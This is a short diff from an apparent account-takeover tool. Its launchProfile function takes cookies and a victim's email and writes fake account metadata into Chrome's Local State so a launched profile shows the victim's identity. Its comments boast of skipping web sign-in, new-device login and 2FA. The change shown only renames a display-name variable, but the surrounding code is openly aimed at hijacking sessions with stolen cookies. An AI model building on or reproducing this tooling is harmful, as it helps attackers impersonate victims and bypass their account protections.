@@ -60,23 +60,23 @@ async function launchProfile({ profileId, cookies, email, userId, gaiaId = '', d
   // Write account metadata into Local State BEFORE launch so Chrome
   // shows the victim's email in the profile icon immediately.
   // No web sign-in flow, no new-device login, no 2FA challenge.
-  const displayName = email.split('@')[0].replace(/[._]/g, ' ');
+  const localDisplayName = email.split('@')[0].replace(/[._]/g, ' ');
   const localState = {
     profile: {
       info_cache: {
         Default: {
           active_time: Date.now() / 1000,
           avatar_icon: 'chrome://theme/IDR_PROFILE_AVATAR_26',
-          gaia_given_name: displayName,
+          gaia_given_name: localDisplayName,
           gaia_id: '',
-          gaia_name: displayName,
+          gaia_name: localDisplayName,
           hosted_domain: '',
           is_consented_primary_account: false,
           is_ephemeral: false,
           is_using_default_avatar: true,
           is_using_default_name: false,
-          name: displayName,
-          shortcut_name: displayName,
+          name: localDisplayName,
+          shortcut_name: localDisplayName,
           user_name: email,
         },
       },
